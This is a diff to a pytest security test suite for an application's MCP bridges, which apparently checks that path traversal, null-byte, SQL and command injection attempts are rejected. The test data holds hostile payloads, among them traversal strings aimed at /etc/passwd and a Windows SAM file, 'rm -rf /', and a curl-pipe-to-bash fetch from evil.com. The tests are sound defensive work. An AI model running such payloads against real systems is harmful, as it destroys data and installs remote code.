@@ -26,7 +26,18 @@ from fastapi.testclient import TestClient
 
 # Import MCP bridges
 from api.filesystem_mcp import ALLOWED_DIRECTORIES, is_path_allowed
+from api.schemas_system import ThinkingStage
 from app_factory import create_app
+from auth_middleware import check_admin_permission
+from autobot_shared.ssot_config import config
+
+# The project root the filesystem bridge whitelists, read from the same config
+# the bridge reads (#13162). These constants used to be written as literal
+# "${AUTOBOT_PROJECT_ROOT:-...}" / "/home/${USER:-autobot}/Desktop/" strings —
+# shell placeholders that Python never expands, so the "legitimate path" cases
+# asserted against paths that exist nowhere.
+PROJECT_ROOT = str(config.base_dir).rstrip("/")
+TMP_ROOT = "/tmp/autobot"  # nosec B108 - matches the bridge's own whitelist entry
 
 
 @pytest.fixture
@@ -39,6 +50,23 @@ def app():
 def client(app):
     """Create test client"""
     return TestClient(app)
+
+
+@pytest.fixture
+def admin_client(app):
+    """Test client that satisfies the admin dependency.
+
+    Several MCP bridges are admin-gated (#744), so an anonymous probe is
+    rejected at the auth layer and never reaches the handler under test. Tests
+    that need to observe how the *handler* treats hostile input use this client
+    so the input validation is what decides the response, not the missing
+    session.
+    """
+    app.dependency_overrides[check_admin_permission] = lambda: True
+    try:
+        yield TestClient(app)
+    finally:
+        app.dependency_overrides.pop(check_admin_permission, None)
 
 
 @pytest.fixture
@@ -77,8 +105,8 @@ class TestFilesystemMCPPathTraversal:
         traversal_attempts = [
             "../../../etc/passwd",
             "../../../../../../etc/passwd",
-            "/tmp/autobot/../../../etc/passwd",  # nosec B108 - test/controlled code uses tmpdir intentionally
-            "${AUTOBOT_PROJECT_ROOT:-/opt/autobot/code_source}/../../../../../../etc/passwd",
+            f"{TMP_ROOT}/../../../etc/passwd",
+            f"{PROJECT_ROOT}/../../../../../../etc/passwd",
         ]
 
         for attack_path in traversal_attempts:
@@ -109,7 +137,7 @@ class TestFilesystemMCPPathTraversal:
         """Test Windows-style path traversal attempts"""
         traversal_attempts = [
             "..\\..\\..\\etc\\passwd",
-            "/tmp/autobot/..\\..\\..\\etc\\passwd",  # nosec B108 - test/controlled code uses tmpdir intentionally
+            f"{TMP_ROOT}/..\\..\\..\\etc\\passwd",
             "..\\..\\windows\\system32\\config\\sam",
         ]
 
@@ -120,9 +148,9 @@ class TestFilesystemMCPPathTraversal:
     def test_path_traversal_null_byte(self):
         """Test null byte injection in paths"""
         traversal_attempts = [
-            "/tmp/autobot/file.txt\x00../../etc/passwd",  # nosec B108 - test/controlled code uses tmpdir intentionally
+            f"{TMP_ROOT}/file.txt\x00../../etc/passwd",
             "../../../etc/passwd\x00.txt",
-            "/tmp/autobot\x00/../../../etc/passwd",  # nosec B108 - test/controlled code uses tmpdir intentionally
+            f"{TMP_ROOT}\x00/../../../etc/passwd",
         ]
 
         for attack_path in traversal_attempts:
@@ -145,9 +173,8 @@ class TestFilesystemMCPPathTraversal:
     def test_allowed_paths_are_permitted(self):
         """Test that legitimate paths within allowed directories are permitted"""
         allowed_paths = [
-            "${AUTOBOT_PROJECT_ROOT:-/opt/autobot/code_source}/backend/api/test.py",
-            "/tmp/autobot/temp_file.txt",  # nosec B108 - test/controlled code uses tmpdir intentionally
-            "/home/${USER:-autobot}/Desktop/test_file.json",
+            f"{PROJECT_ROOT}/backend/api/test.py",
+            f"{TMP_ROOT}/temp_file.txt",
         ]
 
         for path in allowed_paths:
@@ -158,7 +185,7 @@ class TestFilesystemMCPPathTraversal:
         """Test path traversal protection via filesystem MCP API"""
         attack_payloads = [
             {"path": "../../../etc/passwd"},
-            {"path": "/tmp/autobot/../../../etc/passwd"},  # nosec B108 - test/controlled code uses tmpdir intentionally
+            {"path": f"{TMP_ROOT}/../../../etc/passwd"},
             {"path": "%2e%2e%2f%2e%2e%2fetc%2fpasswd"},
         ]
 
@@ -265,23 +292,22 @@ class TestFilesystemMCPAccessControl:
         """Test that ALLOWED_DIRECTORIES list is properly configured"""
         assert len(ALLOWED_DIRECTORIES) > 0, "No allowed directories configured"
 
-        # Verify expected directories are in whitelist
-        expected_dirs = [
-            "${AUTOBOT_PROJECT_ROOT:-/opt/autobot/code_source}/",
-            "/tmp/autobot/",  # nosec B108 - test/controlled code uses tmpdir intentionally
-            "/home/${USER:-autobot}/Desktop/",
-        ]
-
-        for expected in expected_dirs:
-            assert expected in ALLOWED_DIRECTORIES, f"Expected directory missing from whitelist: {expected}"
+        # The whitelist is exactly the project root plus the shared temp area.
+        # Asserting equality (not membership) is what makes this a security
+        # test: a fourth root silently added to the bridge fails here.
+        assert ALLOWED_DIRECTORIES == [
+            f"{PROJECT_ROOT}/",
+            f"{TMP_ROOT}/",
+        ], f"Filesystem MCP whitelist changed unexpectedly: {ALLOWED_DIRECTORIES}"
 
     def test_access_to_parent_of_allowed(self):
         """Test that parent directories of allowed paths are blocked"""
-        # /home/${USER:-autobot}/Desktop/ is allowed, but /home/${USER:-autobot}/ should be blocked
+        # A whitelisted root must not make its own parent reachable — neither
+        # by naming a sibling directly nor by climbing out through the root.
         blocked_paths = [
-            "/home/${USER:-autobot}/private_file.txt",
-            "${HOME}/.ssh/id_rsa",
-            "/home/${USER:-autobot}/.bashrc",
+            f"{Path(TMP_ROOT).parent}/sibling_of_allowed_root.txt",
+            f"{Path(PROJECT_ROOT).parent}/sibling_of_project_root.txt",
+            f"{TMP_ROOT}/../escaped_via_allowed_root.txt",
         ]
 
         for path in blocked_paths:
@@ -330,10 +356,7 @@ class TestMCPInputValidation:
         for payload in sql_injection_payloads:
             response = client.post(
                 "/api/filesystem/mcp/search_files",
-                json={
-                    "path": "/tmp/autobot",
-                    "pattern": payload,
-                },  # nosec B108 - test/controlled code uses tmpdir intentionally
+                json={"path": TMP_ROOT, "pattern": payload},
             )
             # Should handle safely (not crash)
             assert response.status_code in [
@@ -366,7 +389,7 @@ class TestMCPInputValidation:
             # Should handle safely without executing scripts
             assert response.status_code in [200, 400, 422]
 
-    def test_command_injection_attempts(self, client):
+    def test_command_injection_attempts(self, admin_client):
         """Test command injection protection"""
         command_injection_payloads = [
             "test; rm -rf /",
@@ -376,14 +399,17 @@ class TestMCPInputValidation:
             "test $(curl evil.com/backdoor.sh | bash)",
         ]
 
-        # Test filesystem operations
+        # create_directory is admin-gated (#744), so an anonymous client is
+        # turned away before the path is ever looked at — which would make this
+        # assertion pass without exercising the handler. admin_client removes
+        # that shortcut so the payload itself decides the outcome.
         for payload in command_injection_payloads:
-            response = client.post(
+            response = admin_client.post(
                 "/api/filesystem/mcp/create_directory",
-                json={"path": f"/tmp/autobot/{payload}"},  # nosec B108 - test/controlled code uses tmpdir intentionally
+                json={"path": f"{TMP_ROOT}/{payload}"},
             )
-            # Should either sanitize or reject
-            assert response.status_code in [200, 400, 403, 422]
+            # Should either sanitize or reject — never reach a shell.
+            assert response.status_code in [200, 400, 403, 422], f"Unexpected response for {payload!r}"
 
     def test_null_byte_injection(self, client):
         """Test null byte injection protection"""
@@ -396,7 +422,7 @@ class TestMCPInputValidation:
         for payload in null_byte_payloads:
             response = client.post(
                 "/api/filesystem/mcp/read_text_file",
-                json={"path": f"/tmp/autobot/{payload}"},  # nosec B108 - test/controlled code uses tmpdir intentionally
+                json={"path": f"{TMP_ROOT}/{payload}"},
             )
             assert response.status_code in [
                 400,
@@ -440,7 +466,7 @@ class TestMCPInputValidation:
         for payload in unicode_payloads:
             response = client.post(
                 "/api/filesystem/mcp/read_text_file",
-                json={"path": f"/tmp/autobot/{payload}"},  # nosec B108 - test/controlled code uses tmpdir intentionally
+                json={"path": f"{TMP_ROOT}/{payload}"},
             )
             # Should handle Unicode safely
             assert response.status_code in [200, 400, 404, 422]
@@ -457,10 +483,7 @@ class TestMCPInputValidation:
         for payload in ldap_payloads:
             response = client.post(
                 "/api/filesystem/mcp/search_files",
-                json={
-                    "path": "/tmp/autobot",
-                    "pattern": payload,
-                },  # nosec B108 - test/controlled code uses tmpdir intentionally
+                json={"path": TMP_ROOT, "pattern": payload},
             )
             assert response.status_code in [200, 400, 422]
 
@@ -506,10 +529,7 @@ class TestMCPSizeLimiting:
     def test_excessive_file_list(self, client):
         """Test protection against reading excessive number of files"""
         # Try to read 1000 files at once
-        file_paths = [
-            f"/tmp/autobot/file{i}.txt"
-            for i in range(1000)  # nosec B108 - test/controlled code uses tmpdir intentionally
-        ]
+        file_paths = [f"{TMP_ROOT}/file{i}.txt" for i in range(1000)]
 
         response = client.post("/api/filesystem/mcp/read_multiple_files", json={"paths": file_paths})
 
@@ -604,17 +624,26 @@ class TestStructuredThinkingMCPSecurity:
             # Should validate stage names
             assert response.status_code in [400, 422]
 
-    def test_excessive_thought_history(self, client):
+    def test_excessive_thought_history(self, admin_client):
         """Test protection against excessive thought history"""
         # Try to create 10,000 thoughts in single session
         session_id = "test_session_overflow"
 
         for i in range(100):  # Test with 100 for performance
-            response = client.post(
+            response = admin_client.post(
                 "/api/structured_thinking/mcp/process_thought",
+                # A well-formed request, so a rejection here means the bridge
+                # pushed back on the volume — the thing under test. The payload
+                # used to send stage="problem_definition" and omit the required
+                # counters, which 422s on the first call and never exercised
+                # history growth at all. Stage values are the ThinkingStage enum
+                # labels ("Problem Definition"), not snake_case.
                 json={
-                    "stage": "problem_definition",
+                    "stage": ThinkingStage.PROBLEM_DEFINITION.value,
                     "thought": f"Thought {i}",
+                    "thought_number": i + 1,
+                    "total_thoughts": 100,
+                    "next_thought_needed": i < 99,
                     "session_id": session_id,
                 },
             )
@@ -633,25 +662,23 @@ class TestSecurityCoverage:
     """Meta-tests to verify security test coverage"""
 
     def test_all_mcp_bridges_tested(self):
-        """Verify all MCP bridges have security tests"""
+        """Verify the bridges this file exercises are real, registered bridges."""
+        # Read the registry instead of restating it. The old copy listed five
+        # bridges and had gone stale against MCP_BRIDGES, and it also counted
+        # "mcp_registry" as a bridge — the registry is the aggregator over the
+        # bridges (covered by TestMCPRegistrySecurity), never a member of them.
+        from api.mcp_registry import MCP_BRIDGES
+
+        registered_bridges = {name for name, _desc, _endpoint, _features in MCP_BRIDGES}
+
         tested_bridges = {
             "filesystem_mcp",
             "sequential_thinking_mcp",
             "structured_thinking_mcp",
-            "mcp_registry",
         }
 
-        # From mcp_registry.py:
-        expected_bridges = {
-            "filesystem_mcp",
-            "sequential_thinking_mcp",
-            "structured_thinking_mcp",
-            "knowledge_mcp",
-            "vnc_mcp",
-        }
-
-        # All bridges should have at least input validation tests
-        assert tested_bridges.issubset(expected_bridges), "Not all MCP bridges have security tests"
+        missing = tested_bridges - registered_bridges
+        assert not missing, f"Security tests target bridges that are not registered: {sorted(missing)}"
 
     def test_critical_attack_vectors_covered(self):
         """Verify all critical attack vectors are tested"""
